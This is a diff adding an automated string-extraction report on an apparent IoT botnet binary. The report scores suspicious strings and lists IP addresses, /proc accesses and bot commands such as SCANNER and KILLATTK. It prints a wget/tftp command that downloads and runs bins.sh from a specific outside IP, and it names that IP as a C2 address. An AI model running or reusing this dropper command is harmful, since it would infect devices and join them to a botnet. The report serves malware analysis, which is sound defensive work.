@@ -1,0 +1,84 @@
+=============================================================================
+========	BINARY ID :68abf565c87c9119ef4600d4b1d9b8506a9530c4==================================================
+================================================================================
+================================================================================
+========	STRINGS SUMMARY : =====================================================
+================================================================================
+TOTAL STRINGS COUNT :479
+SUPSCPECTED LINES COUNT :41
+SUPSCPECTED STRINGS COUNT (DISTINCT) :17
+SUPSCPECTED STRINGS WEIGHT :62
+SUSPECT STRING SCORE : [62 / 150] 41%
+USER AGENTS STRINGS COUNT :0
+STATIC IPs STRINGS COUNT :2
+DYNAMIC IPs STRINGS COUNT :1
+================================================================================
+========	STRINGS DETAILS : =====================================================
+================================================================================
+================================================================================
+========	SUSPECTED STRINGS : =====================================================
+================================================================================
+busybox wget || wget 185.158.113.30/bins.sh; busybox tftp || tftp -g -r 185.158.113.30 bins.sh; sh bins.sh || bash bins.sh\r\n
+/bin/sh
+/proc/cpuinfo
+PING
+Invalid flag "%s"
+GETLOCALIP
+KILLATTK
+/proc/net/route
+%sWelcome to the botnet [%s:%s:%d cores] :)%s
+%sCould not connect to commServer!%s\n
+SCANNER
+SCANNER ON | OFF
+SCANNER STOPPED!
+attempting to start scanner
+SCANNER STARTED!
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+No such process
+Interrupted system call
+No child processes
+Too many open files in system
+Read-only file system
+Level 2 not synchronized
+Machine is not on the network
+Name not unique on network
+Interrupted system call should be restarted
+Socket operation on non-socket
+Protocol wrong type for socket
+Socket type not supported
+Network is down
+Network is unreachable
+Network dropped connection on reset
+Software caused connection abort
+Connection reset by peer
+Transport endpoint is already connected
+Transport endpoint is not connected
+Connection timed out
+Connection refused
+Host is down
+No route to host
+Operation already in progress
+Operation now in progress
+================================================================================
+========	USER AGENTS STRINGS : =====================================================
+================================================================================
+================================================================================
+========	STATIC IP ADRESSES : =====================================================
+================================================================================
+185.158.113.30:7
+8.8.8.8
+================================================================================
+========	DYNAMIC IP MASKS : =====================================================
+================================================================================
+%d.%d.%d.%d
+================================================================================
+========	/proc FOLDER ACCESS : =====================================================
+================================================================================
+/proc/cpuinfo
+/proc/net/route
+================================================================================
+========	HISTORY TEMPERING : =====================================================
+================================================================================
+================================================================================
+========	AUTOINSTALL COMMANDS : =====================================================
+================================================================================
